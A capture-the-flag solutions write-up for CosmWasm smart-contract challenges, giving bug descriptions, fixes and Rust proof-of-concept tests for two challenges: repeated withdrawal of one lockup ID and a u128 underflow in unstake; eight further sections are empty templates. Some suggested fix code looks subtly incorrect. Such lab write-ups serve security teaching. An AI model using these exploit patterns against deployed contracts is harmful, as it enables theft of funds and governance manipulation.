# Solutions to the CTF

## Challenge 01: *Mjolnir*

### Description

Hello guys my name is Jess I am a security researcher mostly in the area of Windows binary exploitation.
I think the issue in this challenge, is that in the withdraw() function in contract.rs, on L#94, you can
claim multiple times for the same ID. You could fix this by keeping a list of unlocked lockup ids, and
return Err if this list contains the lockup.id

(I think there are also some fancy slice tricks which you could use to deduplicate vec entries without
adding an extra mem allocation, but don't think is stabilized yet, just in nightly; also this way makes
the developer's intention clear)

Incidentally this is kind of reminescent of the Mirror exploit from the halcyon days of 2021 :)
  
### Recommendation

error.rs:
```rust
#[derive(Error, Debug)]
pub enum ContractError {
    #[error("{0}")]
    Std(#[from] StdError),

    #[error("Unauthorized")]
    Unauthorized {},

    #[error("Duplicate Position")]
    DuplicatePosition {},
}
```

contract.rs:
```rust
    let mut unlocked_ids: Vec<Uint128> = vec![];
    for lockup in lockups {
        // validate owner and time
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized {});
        }

        // validate position lockup
        if unlocked_ids.contains(lockup.id) {
            return Err(ContractError::DuplicatePosition {});
        }
        // push lockup id
        unlocked_ids.push(lockup.id);

        // increase total amount
        total_amount += lockup.amount;

        // remove from storage
        LOCKUPS.remove(deps.storage, lockup.id);
    }
```

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let sender = Addr::unchecked(USER);

        // test query
        let msg = QueryMsg::GetLockup { id: 1 };
        let lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(lockup.owner, sender);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // test withdraw
        // claim for the same id repeatedly
        let msg = ExecuteMsg::Withdraw { ids: vec![1,1,1,1,1,1,1,1,1,1] };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // verify funds received
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        // contract was funded with 10 deposit_amount
        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10));
    }
```

---

## Challenge 02: *Gungnir*

### Description

One mistake people make surprisingly often is to assume that Rust guards against integer underflow/overflow.
The result of an arithmetic operation in Rust *can not be undefined* due to its strict type semantics.
So the compiler will perform static checks, but can't assume the result of addition or subtraction at runtime.
Any additional runtime checks which rustc would add incur additional overhead, so they must be made explicit
in Cargo.toml if you want to advantage of them. This is an understandable oversight especially for developers
coming from the world of Solidity smart contracts (where type safety and optimization are sometimes not a priority).


I observe first of all that this is the release profile in Cargo.toml (note the last setting particularly)
[this is the default for release profile, as well](https://doc.rust-lang.org/cargo/reference/profiles.html)
```
[profile.release]
opt-level = 3
debug = false
rpath = false
lto = true
debug-assertions = false
codegen-units = 1
panic = 'abort'
incremental = false
overflow-checks = false
```

And next I see that unstake does not check the unlock_amount (which is arbitrary user input) against the
user.total_tokens:
```rust
/// Entry point for users to decrease voting power
pub fn unstake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power -= unlock_amount;
```

Thus you can violate the program invariant that stake < total tokens, which is assumed here on L#105:
    // cannot stake more than total tokens
We can fix this by adding additional sanity checks! Or we can use checked_sub instead of -=. Or both!

[Here](https://www.sec3.dev/blog/understanding-arithmetic-overflow-underflows-in-rust-and-solana-smart-contracts) is a blog from the fine folks at sec3 about the issue. It mostly concerns solana programs, but the
same idea applies here for cosmwasm!


### Recommendation

```rust
/// Entry point for users to decrease voting power
pub fn unstake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    // cannot UNstake more than total tokens
    if unlock_amount > user.total_tokens.u128() {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power = user.voting_power.checked_sub(unlock_amount);

    VOTING_POWER
        .save(deps.storage, &info.sender, &user)
        .unwrap();

    Ok(Response::new()
        .add_attribute("action", "unstake")
        .add_attribute("unlock_amount", unlock_amount.to_string())
        .add_attribute("user.voting_power", user.voting_power.to_string()))
}
```
And maybe change the release profile to be overflow-checks = true if we don't mind the overhead

### Proof of concept
Tests can give people a false sense of confidence. If your test does not reflect the release environment,
its results may not catch bugs which surface in production

If we run this with cargo's default test profile (ie with debug assertions enabled and optimizations disabled),
it will fail. However, if we run it with cargo test --release then it will pass:

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let amount = Uint128::new(1_000);

        app = mint_tokens(app, USER.to_string(), amount);
        let sender = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(amount.u128(), DENOM)],
        )
        .unwrap();

        // no funds left
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // query user
        let msg = QueryMsg::GetUser {
            user: (&USER).to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, amount);

        // normal stake
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // query voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, amount.u128());

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // evil unstake
        let msg = ExecuteMsg::Unstake {
            // -1 should give us u128::MAX voting_power
            unlock_amount: amount.u128() + 1,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // hella voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, u128::MAX);
    }
```

---

## Challenge 03: *Laevateinn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 04: *Gram*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: *Draupnir*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 06: *Hofund*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 07: *Tyrfing*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 08: *Gjallarhorn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 09: *Brisingamen*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 10: *Mistilteinn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```
